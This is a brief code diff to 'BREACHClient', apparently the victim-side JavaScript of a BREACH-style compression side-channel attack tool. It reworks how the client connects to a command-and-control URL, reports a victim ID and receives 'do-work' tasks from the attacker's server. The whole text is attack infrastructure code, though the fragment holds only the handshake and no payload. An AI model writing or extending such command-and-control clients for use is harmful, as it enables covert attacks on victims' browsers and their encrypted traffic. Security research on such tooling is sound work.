@@ -10,16 +10,18 @@ var BREACHClient = {
         this._socket = io.connect(config.COMMAND_CONTROL_URL);
         this._socket.on('connect', () => {
             console.log('Connected');
-        });
-        this._socket.emit('victim_id', {
-                victim_id: config.victim_id
+            this._socket.emit('client-hello', {
+                VICTIM_ID: config.VICTIM_ID
             });
+        });
         this._socket.on('do-work', (work) => {
             console.log('do-work message');
             this.doWork(work);
         });
-        this.getWork();
-        console.log('Initialized');
+        this._socket.on('server-hello', () => {
+            this.getWork();
+            console.log('Initialized');
+	 });
     },
     noWork() {
         console.log('No work');
